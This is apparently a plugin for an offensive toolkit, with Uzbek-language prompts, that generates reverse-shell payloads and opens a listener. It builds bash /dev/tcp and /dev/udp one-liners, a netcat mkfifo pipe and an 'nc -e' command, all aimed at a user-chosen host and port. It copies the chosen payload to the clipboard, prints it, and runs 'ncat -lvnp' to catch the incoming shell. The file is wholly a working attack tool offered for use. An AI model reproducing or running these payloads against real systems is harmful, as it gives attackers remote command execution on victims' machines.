import os
from plugins.common import *
import pyperclip

def ohios(host, port, _type, shell):
    ohio = {
        'bash_i':        f"{shell} -i >& /dev/tcp/{host}/{port} 0>&1",
        'bash_196':      f"0<&196;exec 196<>/dev/tcp/{host}/{port}; csh <&196 >&196 2>&196",
        'bash_read_line':f"exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
        'bash_5':        f"{shell} -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5",
        'bash_udp':      f"{shell} -i >& /dev/udp/{host}/{port} 0>&1",
        'nc_mkfifo':     f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {host} {port} >/tmp/f",
        'nc_e':          f"nc {host} {port} -e {shell}",
    }
    return ohio.get(_type, "what u doing gng")

def shell(host, port, bind):
    if not checkip(host):
        logging.error('Real IP Kiriting')
        return

    shells = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']
    types  = ['bash_i', 'bash_196', 'bash_read_line', 'bash_5', 'bash_udp', 'nc_mkfifo', 'nc_e']

    print(f"\n{white}• {red}Mumkin qobiqlar:")
    for s in shells:
        print(f"  {gray}• {white}{s}")
    print()

    uno = input(f"{red}Qobiqni tanlang>{white} ").strip()
    if uno not in shells:
        logging.error('Mumkin qobiqni tanlang')
        return

    if not str(port).isdigit() or not (1 <= int(port) <= 65535):
        logging.error('Xato port raqami')
        return

    print(f"\n{white}• {red}Mumkin turlar:")
    for t in types:
        print(f"  {gray}• {white}{t}")
    print()

    t = input(f"{red}Turni tanlang>{white} ").strip()
    if t not in types:
        logging.error('Real turni tanlang')
        return

    result = ohios(host, port, t, uno)
    try: pyperclip.copy(result)
    except Exception as e: logging.error("Couldn't copy string to clipboaard")
    print(f"\n{green}Payload>{white} {result}\n")

    os.system(f"ncat -lvnp {bind}")
